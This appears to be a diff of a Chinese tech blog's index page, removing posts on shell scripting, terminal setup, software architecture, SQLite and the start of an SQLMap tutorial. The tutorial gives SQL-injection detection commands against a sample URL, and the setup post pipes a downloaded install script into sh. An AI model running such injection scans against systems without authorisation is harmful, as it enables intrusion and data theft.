-<p>Bash、Z Shell 和 Fish Shell 各有优点，也有一些相似之处。既然对它们有了更多的了解，你就可以在工作中更有效地使用它们。<br>如果你想要更可配置的 shell，你可以使用 Zsh（甚至安装 Oh My Zsh）。如果你想要更多交互的终端体验，同时不需要大量配置，你可以使用 Fish Shell。如果你想要经典的感觉，你可以保留 Bash。</p>
-</blockquote>
-<h2 id="shell脚本"><a href="#shell脚本" class="headerlink" title="shell脚本"></a>shell脚本</h2><h3 id="shell-基础"><a href="#shell-基础" class="headerlink" title="shell 基础"></a>shell 基础</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量赋值</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> `<span class="built_in">ls</span> /etc`</span><br><span class="line">或</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> $(<span class="built_in">ls</span> /etc)</span><br><span class="line"><span class="comment"># 以上语句将 /etc 下目录的文件名循环出来。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取字符串长度 &#123;#&#125;</span></span><br><span class="line"><span class="comment"># $&#123;#string&#125; 等价于 $&#123;#string[0]&#125;:</span></span><br><span class="line">string=<span class="string">&quot;abcd&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#string&#125;</span>   <span class="comment"># 输出 4</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#string[0]&#125;</span>   <span class="comment"># 输出 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 运算符</span></span><br><span class="line">val=`<span class="built_in">expr</span> 2 + 2`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;两数之和为 : <span class="variable">$val</span>&quot;</span> <span class="comment"># 输出 两数之和为 : 4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f  file ]    <span class="comment"># 如果 文件存在</span></span><br><span class="line"><span class="keyword">if</span> [ -d ...   ]    <span class="comment"># 如果 目录存在</span></span><br><span class="line"><span class="keyword">if</span> [ -s file  ]    <span class="comment"># 如果 文件存在且非空 </span></span><br><span class="line"><span class="keyword">if</span> [ -r file  ]    <span class="comment"># 如果 文件存在且可读</span></span><br><span class="line"><span class="keyword">if</span> [ -w file  ]    <span class="comment"># 如果 文件存在且可写</span></span><br><span class="line"><span class="keyword">if</span> [ -x file  ]    <span class="comment"># 如果 文件存在且可执行   </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 整数变量表达式</span></span><br><span class="line"><span class="keyword">if</span> [ int1 -eq int2 ]    <span class="comment"># 如果 int1等于int2   </span></span><br><span class="line"><span class="keyword">if</span> [ int1 -ne int2 ]    <span class="comment"># 如果 不等于    </span></span><br><span class="line"><span class="keyword">if</span> [ int1 -ge int2 ]    <span class="comment"># 如果 &gt;=</span></span><br><span class="line"><span class="keyword">if</span> [ int1 -gt int2 ]    <span class="comment"># 如果 &gt;</span></span><br><span class="line"><span class="keyword">if</span> [ int1 -le int2 ]    <span class="comment"># 如果 &lt;=</span></span><br><span class="line"><span class="keyword">if</span> [ int1 -lt int2 ]    <span class="comment"># 如果 &lt;</span></span><br><span class="line">   </span><br><span class="line"><span class="comment"># 字符串变量表达式</span></span><br><span class="line"><span class="keyword">if</span>  [ <span class="variable">$a</span> = <span class="variable">$b</span> ]                 <span class="comment"># 如果string1等于string2</span></span><br><span class="line">                                <span class="comment"># 字符串允许使用赋值号做等号</span></span><br><span class="line"><span class="keyword">if</span>  [ <span class="variable">$string1</span> !=  <span class="variable">$string2</span> ]   <span class="comment"># 如果string1不等于string2       </span></span><br><span class="line"><span class="keyword">if</span>  [ -n <span class="variable">$string</span>  ]             <span class="comment"># 如果string 非空(非0），返回0(true)  </span></span><br><span class="line"><span class="keyword">if</span>  [ -z <span class="variable">$string</span>  ]             <span class="comment"># 如果string 为空</span></span><br><span class="line"><span class="keyword">if</span>  [ <span class="variable">$sting</span> ]                  <span class="comment"># 如果string 非空，返回0 (和-n类似) </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nohup 防止进程被挂起或终端结束</span></span><br><span class="line"><span class="built_in">nohup</span> sshpass -p <span class="string">&quot;<span class="variable">$&#123;passphrase&#125;</span>&quot;</span> ssh -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -C -c aes128-gcm@openssh.com -fNg -L 9200:127.0.0.1:9200   ec2-user@xx.xx.xx &gt; /dev/null &amp;</span><br></pre></td></tr></table></figure>
-
-<h3 id="标准脚本"><a href="#标准脚本" class="headerlink" title="标准脚本"></a>标准脚本</h3><p>git 基本上传操作</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数：显示使用说明</span></span><br><span class="line"><span class="function"><span class="title">show_help</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: ./update.sh [options]&quot;</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;This script updates file timestamps, stages changes, commits them to Git,&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;and pushes to the specified branch.&quot;</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Options:&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;  -h, --help          Show this help message and exit.&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;  -c, --commit &lt;msg&gt;  Git commit message (default: &#x27;update&#x27;).&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;  -b, --branch &lt;name&gt; Git branch name (default: &#x27;main&#x27;).&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;  -f, --force         Force add all changes (including untracked files).&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认设置</span></span><br><span class="line">commit_message=<span class="string">&quot;update&quot;</span></span><br><span class="line">branch_name=<span class="string">&quot;main&quot;</span></span><br><span class="line">force_add=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析参数</span></span><br><span class="line"><span class="keyword">while</span> [[ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> != <span class="string">&quot;&quot;</span> ]]; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">        -h | --<span class="built_in">help</span> )</span><br><span class="line">            show_help</span><br><span class="line">            <span class="built_in">exit</span> 0</span><br><span class="line">            ;;</span><br><span class="line">        -c | --commit )</span><br><span class="line">            <span class="built_in">shift</span></span><br><span class="line">            commit_message=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">            ;;</span><br><span class="line">        -b | --branch )</span><br><span class="line">            <span class="built_in">shift</span></span><br><span class="line">            branch_name=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">            ;;</span><br><span class="line">        -f | --force )</span><br><span class="line">            force_add=<span class="literal">true</span></span><br><span class="line">            ;;</span><br><span class="line">        * )</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;Unknown option: <span class="variable">$1</span>&quot;</span></span><br><span class="line">            show_help</span><br><span class="line">            <span class="built_in">exit</span> 1</span><br><span class="line">            ;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line">    <span class="built_in">shift</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加文件到 Git</span></span><br><span class="line"><span class="keyword">if</span> <span class="variable">$force_add</span>; <span class="keyword">then</span></span><br><span class="line">    git add -A  <span class="comment"># 强制添加所有变化，包括未追踪的文件</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    git add .   <span class="comment"># 仅添加已追踪的文件的变化</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交变更并使用指定的提交信息</span></span><br><span class="line">git commit -m <span class="string">&quot;<span class="variable">$commit_message</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 推送到指定的远程分支</span></span><br><span class="line">git push origin <span class="string">&quot;<span class="variable">$branch_name</span>&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Mac-终端优化-（iTerm2-oh-my-zsh-powerlevel10k"><a href="#Mac-终端优化-（iTerm2-oh-my-zsh-powerlevel10k" class="headerlink" title="Mac 终端优化 （iTerm2 + oh my zsh + powerlevel10k)"></a>Mac 终端优化 （iTerm2 + oh my zsh + powerlevel10k)</h3><h4 id="安装-iTerm2-terminal的优化"><a href="#安装-iTerm2-terminal的优化" class="headerlink" title="安装 iTerm2 -&gt; terminal的优化"></a>安装 <em><strong>iTerm2</strong></em> -&gt; terminal的优化</h4><p><a target="_blank" rel="noopener" href="https://iterm2.com/">iTerm2</a></p>
-<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1757146">iTerm2 - 解决文本复制不了问题</a></p>
-<h4 id="安装-oh-my-zsh-zsh的优化"><a href="#安装-oh-my-zsh-zsh的优化" class="headerlink" title="安装 oh my zsh -&gt; zsh的优化"></a>安装 <em><strong>oh my zsh</strong></em> -&gt; zsh的优化</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2303773">Oh-my-zsh主题乱码解决办法</a></p>
-<h4 id="安装-powerlevel10k-主题"><a href="#安装-powerlevel10k-主题" class="headerlink" title="安装 powerlevel10k 主题"></a>安装 <em><strong>powerlevel10k</strong></em> 主题</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/romkatv/powerlevel10k.git <span class="variable">$ZSH_CUSTOM</span>/themes/powerlevel10k</span><br><span class="line"></span><br><span class="line"><span class="comment">## 或者</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ./.oh-my-zsh/themes</span><br><span class="line">git <span class="built_in">clone</span>  https://github.com/romkatv/powerlevel10k.git</span><br></pre></td></tr></table></figure>
-
-<p>vi ~&#x2F;.zshrc 设置如下内容 使用p10k主题 ZSH_THEME&#x3D;”powerlevel10k&#x2F;powerlevel10k”</p>
-<h4 id="安装语法高亮插件和自动补全插件"><a href="#安装语法高亮插件和自动补全插件" class="headerlink" title="安装语法高亮插件和自动补全插件"></a>安装语法高亮插件和自动补全插件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.oh-my-zsh/custom/plugins/</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions</span><br></pre></td></tr></table></figure>
-
-<p>vi ~&#x2F;.zshrc 在插件配置处添加下载的这两个插件名</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">     git</span><br><span class="line">     zsh-syntax-highlighting</span><br><span class="line">     zsh-autosuggestions</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-<h3 id="重新选择风格"><a href="#重新选择风格" class="headerlink" title="重新选择风格"></a>重新选择风格</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p10k configure</span><br></pre></td></tr></table></figure>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2026/09/19/social-engineering/">
-                社工库工具
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2026-09-19</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/渗透/">渗透</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p>国外情报专家最常用的OSINT工具</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/guchangan1/All-Defense-Tool?tab=readme-ov-file#%E7%A4%BE%E5%B7%A5%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%B1%BB">a</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.topgoer.cn/docs/offensive/offensive-1e1ht41abkse7">b</a></p>
-<ul>
-<li><em><strong>Sherlock</strong></em> 是社交媒体账户追踪（爬虫）工具，可用于收集有关人员的信息，对记者和安全研究人员特别有用</li>
-</ul>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2026/09/19/software-structure/">
-                软件架构演变
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2026-09-19</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/架构/">架构</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h2 id="前端了解"><a href="#前端了解" class="headerlink" title="前端了解"></a>前端了解</h2><p>浏览器基本内核：</p>
-<ul>
-<li>IE(7,8,9,10 这几个版本难以兼容) -&gt; Trident内核 （目前淘汰）</li>
-<li>Chrome: Webkit内核 -&gt; Blink内核</li>
-<li>火狐: Gecko内核</li>
-<li>Safari: Webkit内核</li>
-<li>Opera: Presto -&gt; Webkit内核 -&gt; Blink内核</li>
-</ul>
-<h2 id="单体架构"><a href="#单体架构" class="headerlink" title="单体架构"></a>单体架构</h2><p>在单体架构的体系内，对象关系映射（ORM）框架是一个至关重要的组件，其主要功能在于抽象化和简化数据库的增删改查（CRUD）操作。ORM通过封装底层数据库操作的复杂性，显著提升了数据访问层的开发效率。ORM框架的核心功能在于将关系型数据库中的数据模型转换为应用程序中的对象模型，实现了数据访问的抽象化。此种映射机制有效地减少了开发者在进行数据库交互时所需编写的代码量，从而使得开发人员能够将更多的精力投入到业务逻辑的实现上，而非数据访问的具体技术细节。</p>
-<p><img src="/images/single-software-structure.png"></p>
-<p><em><strong>优点:</strong></em></p>
-<ul>
-<li>开发的便捷性、部署的简洁性以及相对易于管理的横向扩展能力</li>
-<li>开发人员能够在一个统一的代码库中进行快速的迭代和调试，从而加速了开发进程</li>
-</ul>
-<p><em><strong>缺点:</strong></em></p>
-<ul>
-<li>系统的任何微小改动都可能触发对整个应用程序的重新部署，这不仅加剧了维护工作的复杂性，也提高了系统潜在的错误风险</li>
-<li>单体架构在处理大规模用户或数据时，其横向扩展能力受到限制，性能瓶颈成为一个显著问题</li>
-</ul>
-<p><em><strong>基本框架：</strong></em></p>
-<ul>
-<li>前端 - angular jq 模版引擎ecshop(smart)</li>
-<li>后台 - Java(spring mvc, Struts2) PHP(Yii2 zendFramework2, thinkphp3.2)</li>
-</ul>
-<h2 id="多层架构"><a href="#多层架构" class="headerlink" title="多层架构"></a>多层架构</h2><p>应用程序被细分为多个层次，主要包括表现层（用户界面）、业务逻辑层和数据访问层，这一模式通常被称作模型-视图-控制器（MVC）。这种分层的设计方法允许每一层独立进行开发和测试，从而显著提升了代码的可管理性和可维护性。</p>
-<p>多层架构的设计理念体现了专业领域分工的细化，即所谓的垂直领域专业化。它是社会分工精细化趋势在软件开发领域的体现。在这种架构中，前后端的分离正是一种垂直拆分的实践，而MVC本身也是垂直架构的一个典型示例。</p>
-<p><img src="/images/mult-software-structure.png"></p>
-<p><em><strong>优点:</strong></em></p>
-<ul>
-<li>尽管层与层之间的耦合较单体架构有所减少<br><em><strong>缺点:</strong></em></li>
-<li>某一层的变更仍有可能引发连锁反应，影响到其他层的稳定性和功能。</li>
-</ul>
-<p>一般会采用敏捷开发杜绝此类现象，产品周期性迭代<br>逐渐有了devops的概念</p>
-<h3 id="读写分离的数据库架构"><a href="#读写分离的数据库架构" class="headerlink" title="读写分离的数据库架构"></a>读写分离的数据库架构</h3><p><img src="/images/rw-software-structure.png"></p>
-<p><em><strong>原因：</strong></em><br>公司又增加了很多新的业务，系统也增加了更多的功能。预定蔬菜的商户也可以通过手机查看历史订单和各种统计信息了，即使怎么增加应用服务器，也会出现用户需要等待很长的时间，最终数据库也出现了瓶颈。</p>
-<p><em><strong>解决方案：读写分离</strong></em><br>数据库是分布式架构中最难的问题，因为不像应用服务器是不保存数据的。如果想要增加数据库服务器的数量，那么首先需要解决数据重复和一致性的问题。现实中对应的方案有很多，例如读写分离、数据库物理分区、逻辑分表、逻辑分库，但本质上讲只是拆分数据库操作的方式不同而已，而我们应对数据库性能最常用和性价比最高的方式是读写分离</p>
-<p>有了锁的概念 读写锁 乐观锁 悲观锁 </p>
-<h3 id="用消息队列的架构"><a href="#用消息队列的架构" class="headerlink" title="用消息队列的架构"></a>用消息队列的架构</h3><p><img src="/images/rw-cache-software-structure.png"></p>
-<p><em><strong>原因：</strong></em><br>相应的系统中往往存在这种类似的场景，当我们视频网站上传了一条视频后，视频网站往往会进行转码以便适合网络播放，这种操作需要耗费大量的服务器资源，不可能实时的在用户点击提交后处理完毕，否则用户需要等待很久，甚至连接超时。</p>
-<p><em><strong>解决方案：消息队列</strong></em><br>我们可以让此类任务不必是实时完成的。当用户提交请求后，系统会把任务添加到消息队列中，完成之后改变数据的状态，用户在刷新或接到通知后知道任务已经处理完毕。<br>随着业务的发展，公司开始向新的领域扩张，开发了拓展更多商户的代理平台和物流平台，甚至需要和和第三方平台对接，而且需要保证这些平台中一些通用的数据和逻辑是一致的。</p>
-<h3 id="过度阶段-面向服务的架构SOA"><a href="#过度阶段-面向服务的架构SOA" class="headerlink" title="过度阶段 面向服务的架构SOA"></a>过度阶段 面向服务的架构SOA</h3><p><em><strong>原因：</strong></em><br>软件系统变得越来越复杂，参与的开发者就越多，应用系统的分离和分化就变得很有意义了。面向前端的API应用服务器不再真正的处理业务逻辑而是调用专门的服务器来完成。</p>
-<p>单点登录（SSO）是一个典型的面向服务的架构，在互联网公司中被广泛使用。国内互联网巨头往往拥有多个系统，例如腾讯的QQ音乐、空间都可以使用同一个QQ号登陆。于是用户服务和认证服务被剥离开来，各个系统之间通过统一登录和管理用户信息，用户的体验得到了极大的提升，这就是面向服务架构的一个例子。</p>
-<p><img src="/images/SSO-software-structure.png"></p>
-<p>这些大厂不仅在自己的系统内完成了统一的认证和用户管理，并且把登录、授权的服务开放给第三方系统。例如很多网站支持微信登录，这样用户就可以使用一套用户名密码登录大量接入的系统。并且业界有一个通用规范，便于各种系接入，这就是OAuth标准。</p>
-<p><img src="/images/OAuth-software-structure.png"></p>
-<p>通过面向服务的架构改造，系统中分化出了用户服务、物流服务、订单服务等服务，通过OAuth的方式提供了收银机系统认证对接。一些收银机厂商也对接了这个系统，商户可以通过支持的收银设备进行下食材的预定操作了。</p>
-<h2 id="微服务架构"><a href="#微服务架构" class="headerlink" title="微服务架构"></a>微服务架构</h2><p>微服务架构（Microservices Architecture）的兴起源于对传统应用架构的局限性的突破。随着信息技术和互联网的快速发展，企业对于应用的扩展性、可靠性和维护性提出了更高的要求。传统应用架构由于其整体性和复杂性，逐渐难以满足这些需求。在这样的背景下，微服务架构应运而生，以其独特的优势，逐渐成为分布式系统设计的主流架构之一。</p>
-<p>微服务架构是一种分布式系统架构，其核心思想是将一个复杂的应用分解为一组相互协作的微小服务。每个微服务都是独立的业务单元，运行在自己的进程中，并通过轻量级的通信机制（如HTTP RESTful API）相互协作。这些服务围绕业务功能构建，每个服务都有自己的业务逻辑和数据存储，可以独立部署和扩展。</p>
-<p><img src="/images/micro-software-structure.png"></p>
-<p>不同应用和数据之间互相依赖，逻辑纠缠不清，项目的部署进入了混沌状态，对于大型、依赖关系复杂的系统需要一个更为有力的架构。为了解决系统复杂性和服务解耦的问题，这时候该微服务和领域驱动建模（DDD）出场了。</p>
-<p>将不同职责的服务独立部署，从而实现服务内部高内聚，服务之间低耦合的效果，让开发变得更为灵活。当然“分开是为了更好的在一起”，为了重新组合和稳定运行这些服务，人们发明了服务发现、熔断机制、服务部署监控等一篮子工具。</p>
-<p>优点:</p>
-<ul>
-<li>它通过模块化提高了系统的可维护性和可扩展性。每个微服务都是独立的模块，可以单独开发和部署，不会影响到其他服务。</li>
-<li>微服务架构通过服务之间的松耦合，提高了系统的可靠性</li>
-<li>每个服务都有自己的数据存储，避免了单点故障的风险。此外，微服务架构支持技术多样性，每个服务都可以选择最适合其业务需求的技术栈，从而充分发挥各种技术的优势。</li>
-</ul>
-<p>缺点: </p>
-<ul>
-<li>相较于传统应用架构，微服务架构更为复杂，需要更多的管理和协调工作。管理难度大</li>
-<li>微服务架构需要更多的工作量来设计、开发、测试、部署和管理多个小型服务，这增加了开发团队的负担 成本高</li>
-</ul>
-<h2 id="边缘计算架构"><a href="#边缘计算架构" class="headerlink" title="边缘计算架构"></a>边缘计算架构</h2><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7368505674224238607">引用</a><br><a target="_blank" rel="noopener" href="https://shaogefenhao.com/posts/architecture/roamap-of-system.html#%E9%9D%A2%E5%90%91%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%9E%B6%E6%9E%84-soa">引用</a></p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2026/09/19/sqlite/">
-                SQLite
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2026-09-19</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/数据库/">数据库</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进数据库</span></span><br><span class="line">sqlite3 /Users/mac/tabby.db</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看有哪些表</span></span><br><span class="line">.tables</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 user 表内容</span></span><br><span class="line">SELECT * FROM user;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 退出</span></span><br><span class="line">.quit</span><br></pre></td></tr></table></figure>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2026/09/19/sqlmap/">
-                SQLMap
+            <a href="/2026/09/19/wireshark/">
+                Wireshark
             </a>
         </h1>
         <div class="post-info">
@@ -549,654 +327,9 @@
 
     
         <div class="content">
-            <p>文章</p>
-<h2 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h2><h3 id="分类文章"><a href="#分类文章" class="headerlink" title="分类文章"></a>分类文章</h3><h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	http://www.vuln.cn/1992<br />
-</h3>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	sqlmap简介
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	sqlmap支持五种不同的注入模式：
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		4、联合查询注入，可以使用union的情况下的注入。
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		5、堆查询注入，可以同时执行多条语句的执行时的注入。
-	</li>
-</ul>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	sqlmap支持的数据库有
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
-</p>
-<h2 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	检测注入
-</h2>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	基本格式
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	sqlmap -u "http://www.vuln.cn/post.php?id=1"
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	默认使用level1检测全部数据库类型
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）
-</p>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	跟随302跳转
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，<br />
-当注入错误的时候，先报错再跳转的时候，不需要跟随302。<br />
-目的就是：要追踪到错误信息。
-</p>
